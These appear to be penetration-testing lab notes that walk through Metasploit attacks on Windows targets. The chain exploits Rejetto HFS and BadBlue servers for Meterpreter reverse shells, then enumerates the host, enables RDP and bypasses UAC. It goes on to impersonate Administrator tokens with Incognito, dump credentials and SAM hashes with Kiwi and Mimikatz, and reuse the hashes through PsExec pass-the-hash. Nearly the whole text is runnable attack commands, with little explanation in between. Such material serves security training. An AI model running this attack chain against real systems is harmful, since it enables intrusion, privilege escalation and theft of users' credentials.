# Windows Post Exploitation Modules

## Overview

- **Metasploit Framework (MSF)** provides various **post-exploitation modules** for both Windows and Linux systems.
- These modules allow us to enumerate detailed information about the Windows system we've gained access to, such as:
  - **Enumerating user privileges**
  - **Identifying logged-on users**
  - **Checking if the target is a Virtual Machine (VM)**
  - **Enumerating installed programs and patches**
  - **Checking antivirus software and excluded folders**
  - **Enumerating computers connected to a domain**
  - **Enumerating shared directories**

## Demo: Windows Post Exploitation Modules

### Step-by-Step Process

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the post-exploitation process:

```bash
workspace -a windows_post
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

Perform an Nmap scan to identify services:

```bash
db_nmap -sV [targetIP]
```

Search for an **exploitation module** (e.g., Rejetto HFS):

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once access is obtained, interact with the Meterpreter session:

- Retrieve system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Display Meterpreter help:

    ```bash
    help
    ```

- Attempt to escalate privileges:

    ```bash
    getsystem
    ```

- Take a screenshot of the target's desktop:

    ```bash
    screenshot
    ```

- Display mounted drives:

    ```bash
    show_mounts
    ```

- Migrate to another process (replace `2212` with the actual process ID):

    ```bash
    migrate 2212
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

- Download a file from the target system:

    ```bash
    download flag.txt
    ```

Put the session in the background:

```bash
background
```

### Using Post-Exploitation Modules

#### Changing Architecture

Use the **migrate** post-exploitation module to change the architecture:

```bash
use post/windows/manage/migrate
```

Show the available options:

```bash
show options
```

#### Enumerating User Privileges

Search for a **privileges enumeration module**:

```bash
search win_privs
```

Use the **win_privs** module to enumerate the privileges of the current user:

```bash
use post/windows/gather/win_privs
```

Show options:

```bash
show options
```

Set the current session (assuming session `1`):

```bash
set SESSION 1
```

Run the module:

```bash
run
```

#### Enumerating Logged-On Users

Search for a module to enumerate logged-on users:

```bash
search enum_logged_on
```

Use the **enum_logged_on_users** module:

```bash
use post/windows/gather/enum_logged_on_users
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Checking If Target Is a Virtual Machine

Search for the **check_vm** module:

```bash
search checkvm
```

Use the **checkvm** module:

```bash
use post/windows/gather/checkvm
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Programs

Search for the **enum_applications** module:

```bash
search enum_applications
```

Use the **enum_applications** module:

```bash
use post/windows/gather/enum_applications
```

Show options and run the module:

```bash
set SESSION 1
run
```

The module will provide a list of installed programs, which can be cross-referenced to identify potential exploitation opportunities.

Check the collected information:

```bash
loot
```

#### Checking Antivirus Software and Excluded Folders

Search for the **AV enumeration** module:

```bash
search type:post platform:windows enum_av
```

Use the **enum_av_excluded** module:

```bash
use post/windows/gather/enum_av_excluded
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Computers in the Domain

Search for the **enum_computers** module:

```bash
search enum_computer
```

Use the **enum_computers** module:

```bash
use post/windows/gather/enum_computers
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Patches

Search for the **enum_patches** module:

```bash
search enum_patches
```

Use the **enum_patches** module:

```bash
use post/windows/gather/enum_patches
```

Show options and run the module:

```bash
set SESSION 1
run
```

Alternatively, gather patch information manually:

- Switch to session `1`:

    ```bash
    sessions 1
    ```

- Use the Windows shell to get system info:

    ```bash
    shell
    systeminfo
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

#### Enumerating Shares

Search for the **enum_shares** module:

```bash
search enum_shares
```

Use the **enum_shares** module:

```bash
use post/windows/gather/enum_shares
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enabling Remote Desktop (RDP)

Search for an **RDP management module**:

```bash
search rdp platform:windows
```

Use the **enable_rdp** module to enable RDP:

```bash
use post/windows/manage/enable_rdp
```

Show options and run the module:

```bash
set SESSION 1
run
```

### Conclusion

What we accomplished:
- Gained access to a Windows system via Meterpreter.
- Used various **post-exploitation modules** to gather critical information about the system, including user privileges, installed programs, AV solutions, and more.
- Managed the session to further exploit the system and establish deeper control.

# Windows Privilege Escalation: Bypassing UAC

## Bypassing UAC (User Account Control)

- **User Account Control (UAC)**: A Windows security feature introduced in **Windows Vista** to prevent unauthorized changes to the operating system.
- **Purpose of UAC**: Ensures that administrative changes to the OS require explicit approval from the user, preventing unauthorized or malicious actions.
- **Bypassing UAC**: We can use the **Windows Escalate UAC Protection Bypass (In Memory Injection)** Metasploit module. This module bypasses UAC by using the trusted publisher certificate through process injection, which spawns a second shell with UAC disabled.

## Demo: Windows Privilege Escalation: Bypassing UAC

### Step-by-Step Process

Start by checking network configuration:

```bash
ifconfig
```

Start PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the UAC bypass:

```bash
workspace -a UACBypass
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify open ports and services on the target:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit** module:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

### Setting the Payload

Since we want to elevate our privileges to **x64**, we need to use a 64-bit payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the network interface (replace `eth1` with your correct interface):

```bash
set LHOST eth1
```

Run the exploit to obtain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Initial Privilege Enumeration

After successfully obtaining a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Attempt to elevate privileges:

```bash
getsystem
```

Check which privileges we currently have:

```bash
getprivs
```

Verify if we are part of the **Administrators group**:

```bash
shell
```

In the shell, run the following commands:

- List users:

    ```bash
    net users
    ```

- Check if the current user is part of the **Administrators** group:

    ```bash
    net localgroup administrators
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

### Bypassing UAC

List all active sessions:

```bash
sessions
```

Search for the **bypassuac** module:

```bash
search bypassuac
```

Use the **bypassuac_injection** module:

```bash
use exploit/windows/local/bypassuac_injection
```

Set the payload for the **x64 architecture**:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the session ID of the previously obtained shell (assumed to be `1`):

```bash
set SESSION 1
```

Set the local port for the reverse connection (in this case, **4433**):

```bash
set LPORT 4433
```

Run the module:

```bash
run
```

### Selecting the Target

Set the target to **Windows x64** using tab autocompletion:

```bash
set TARGET Windows\ x64
```

Run the exploit again:

```bash
run
```

### Verifying the Second Meterpreter Session

Once the exploit completes, a second **Meterpreter session** will be created with **UAC disabled**.

Check system information in the new session:

```bash
sysinfo
```

Check the user ID to confirm administrative privileges:

```bash
getuid
```

Attempt to escalate privileges again:

```bash
getsystem
```

### Post-Exploitation

With the UAC bypassed, dump the password hashes from the target system:

```bash
hashdump
```

### Conclusion

What we accomplished:
- Used the **Rejetto HFS exploit** to gain an initial Meterpreter session on the target.
- Gathered system and privilege information.
- Used the **UAC bypass module** to create a second **Meterpreter session** with elevated privileges.
- Successfully escalated privileges, disabled UAC, and dumped the password hashes.

# Windows Privilege Escalation: Token Impersonation With Incognito

## Windows Access Tokens

- **Access Tokens**: Core element of the authentication process on Windows, created and managed by the **Local Security Authority Subsystem Service (LSASS)**.
- **Function**: A Windows access token identifies and describes the security context of a process or thread running on a system. It acts as a temporary key, similar to a web cookie, that allows users to access system or network resources without re-entering credentials.
- **Generation**: Access tokens are generated by the **winlogon.exe** process upon successful user authentication. They include the identity and privileges of the associated user account and are attached to processes like **userinit.exe**. All child processes inherit a copy of the access token from their parent process.
- **Categories of Access Tokens**:
  - **Impersonate-Level Tokens**: Created during non-interactive logins (e.g., system services, domain logons). They can be used to impersonate tokens on the local system.
  - **Delegate-Level Tokens**: Created through interactive logins (e.g., traditional logins, remote access via RDP). These tokens pose a larger threat because they can impersonate users on other systems.

## Windows Privileges

- Successful token impersonation requires certain privileges and available tokens on the target system. Key privileges include:
  - **SeAssignPrimaryToken**: Allows impersonation of tokens.
  - **SeCreateToken**: Allows creation of arbitrary tokens with administrative privileges.
  - **SeImpersonatePrivilege**: Allows creation of a process under another user's security context, often with administrative privileges.

## The Incognito Module

- **Incognito**: A built-in **Meterpreter module** originally designed as a standalone tool for impersonating user tokens post-exploitation.
- **Usage**: Incognito can list and impersonate available tokens on the target system, facilitating privilege escalation by using impersonation or delegation tokens.

## Demo: Windows Privilege Escalation: Token Impersonation with Incognito

We will demonstrate how to use **Incognito** to impersonate tokens on a target system, escalating our privileges by leveraging the **SeImpersonatePrivilege**.

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the impersonation attack:

```bash
workspace -a Impersonate
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit**:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the payload to a 64-bit Meterpreter payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Verifying Privileges

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

In this case, we have **NT Authority\Local Service** privileges because we exploited a service.

List the current privileges:

```bash
getprivs
```

We observe that we have the **SeImpersonatePrivilege**, which allows us to impersonate tokens.

### Attempting Privilege Escalation

Verify that we do not have administrative privileges by attempting to dump password hashes:

```bash
hashdump
```

Navigate to the **Administrator** folder:

```bash
cd C:\\
cd Users
cd Administrators
```

### Using the Incognito Module

Load the **Incognito** module in Meterpreter:

```bash
load incognito
```

List the available user tokens:

```bash
list_tokens -u
```

### Impersonating the Administrator Token

We found an **Administrator** delegation token, so we proceed to impersonate it:

```bash
impersonate_token "ATTACKDEFENSE\Administrator"
```

Verify that the user ID has changed:

```bash
getuid
```

### Resolving the Hashdump Failure

The **hashdump** command fails because our current process still uses the access token from the **Local Service** account. To resolve this, we need to migrate to another process.

List the running processes:

```bash
ps
```

Migrate to a process with the correct privileges (replace `3544` with the actual process ID):

```bash
migrate 3544
```

### Post-Migration

Once migrated, retry the **hashdump** command:

```bash
hashdump
```

Navigate to the **Administrator** directory:

```bash
cd C:\\
cd Users
cd Administrator
```

### Conclusion

What we accomplished:
- Gained initial access using the **Rejetto HFS exploit**.
- Identified that we had the **SeImpersonatePrivilege** on the compromised system.
- Used the **Incognito module** to list available tokens and impersonate the **Administrator** token.
- Successfully migrated to a process with administrative privileges to perform post-exploitation tasks such as dumping password hashes.

# Dumping Hashes with Mimikatz

## Overview

- **Mimikatz**: A powerful Windows post-exploitation tool that allows attackers to extract plaintext credentials from memory, as well as password hashes from the local **SAM (Security Account Manager) database**.
- **SAM Database**: A file on Windows systems that stores user passwords, which can be used to authenticate users locally and remotely.
- **Kiwi Extension**: If we have access to a Meterpreter session on a Windows target, we can use the built-in **Kiwi extension**, which is an in-memory execution of Mimikatz, allowing credential dumping without touching the disk.

## Demo: Dumping Hashes With Mimikatz

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Mimikatz attack:

```bash
workspace -a Mimikatz
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploitation

Perform an Nmap scan to identify services on the target:

```bash
db_nmap -sV [targetIP]
```

We discover that the target is running a **BadBlue web server**.

Search for the **BadBlue 2.7 exploit module**:

```bash
search badblue 2.7
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Set the appropriate target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Using Mimikatz

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

List the running processes to find **LSASS (Local Security Authority Subsystem Service)**, which handles security and access tokens:

```bash
ps
```

Locate the **LSASS** process by its name or process ID (replace `792` with the actual process ID of LSASS):

```bash
pgrep lsass
migrate 792
```

### Using the Kiwi (Mimikatz) Extension

Load the **Kiwi** (Mimikatz) extension in Meterpreter:

```bash
load kiwi
```

Check the available commands for Kiwi:

```bash
help
```

#### Dumping Credentials

Dump all credentials from memory using the `creds_all` command:

```bash
creds_all
```

We can only dump the credentials of users who have previously logged into the system.

#### Dumping SAM Database

Dump the contents of the **SAM database**:

```bash
lsa_dump_sam
```

Dump the secrets stored in **LSA (Local Security Authority)**:

```bash
lsa_dump_secrets
```

### Uploading and Executing Mimikatz Manually

If necessary, we can upload the **Mimikatz executable** to the target system:

```bash
upload /usr/share/windows-resources/mimikatz
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Switch to a shell session to execute Mimikatz directly:

```bash
shell
```

Run **Mimikatz** from the shell:

```bash
.\mimikatz.exe
```

### Running Mimikatz Commands

- Enable **debug privileges** in Mimikatz:

    ```bash
    privilege::debug
    ```

- List the logon passwords stored in memory (Note: You will only see users who have previously logged in):

    ```bash
    sekurlsa::logonpasswords
    ```

### Conclusion

What we accomplished:
- Gained initial access by exploiting a vulnerable **BadBlue web server**.
- Migrated to the **LSASS** process to dump credentials.
- Used the **Kiwi extension** in Meterpreter to dump credentials and SAM hashes.
- Uploaded and executed **Mimikatz** to retrieve stored credentials and hashes from the target system.

# Pass-The-Hash With PsExec

## Overview

- **Pass-the-Hash**: An exploitation technique that involves capturing or harvesting **NTLM hashes** or clear-text passwords and using them to authenticate with a target system.
- **PsExec Module**: This technique allows us to authenticate with a target system via **SMB** using legitimate credentials (hashes or passwords) instead of exploiting vulnerabilities in services.
- **Objective**: Using the **PsExec module** in Metasploit, we can authenticate as a legitimate user and gain access to the target system, bypassing the need for direct service exploitation.

## Demo: Pass-The-Hash With PsExec

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **PsExec attack**:

```bash
workspace -a Psexec
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Search for the **BadBlue 2.7 exploit module**:

```bash
search badblue
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Set the appropriate target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Hash Extraction

Once we have a **Meterpreter session**, gather system information:

```bash
getuid
sysinfo
```

List the running processes and locate **LSASS** (Local Security Authority Subsystem Service):

```bash
pgrep lsass
```

Migrate to the **LSASS** process (replace `788` with the actual process ID):

```bash
migrate 788
```

Verify that we have administrative privileges:

```bash
getuid
```

Dump the **NTLM hashes** from the system:

```bash
hashdump
```

Exit the Meterpreter session:

```bash
exit
```

### Using PsExec with Pass-The-Hash

Search for the **PsExec** module:

```bash
search psexec
```

Use the **PsExec** module to authenticate via SMB:

```bash
use exploit/windows/smb/psexec
```

Set the **payload** for a 64-bit Meterpreter reverse TCP connection:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

### Setting Credentials for Pass-The-Hash

Set the **SMB user** as **Administrator**:

```bash
set SMBUser Administrator
```

Set the **SMB password** as the extracted **NTLM hash** (replace `[Hash]` with the actual hash):

```bash
set SMBPass [Hash] or [Password]
```

### Running the Exploit

Run the PsExec exploit to gain a new Meterpreter session:

```bash
run
```

### Post-Exploitation

Once we have a new **Meterpreter session**, list all active sessions:

```bash
sessions
```

### Conclusion

What we accomplished:
- Used the **BadBlue exploit** to gain initial access to the target system.
- Extracted **NTLM hashes** using **Meterpreter**.
- Used the **PsExec module** in Metasploit to perform a **Pass-The-Hash** attack, gaining access to the target system via legitimate credentials.
- Successfully established a **Meterpreter session** through SMB, allowing further post-exploitation activities.






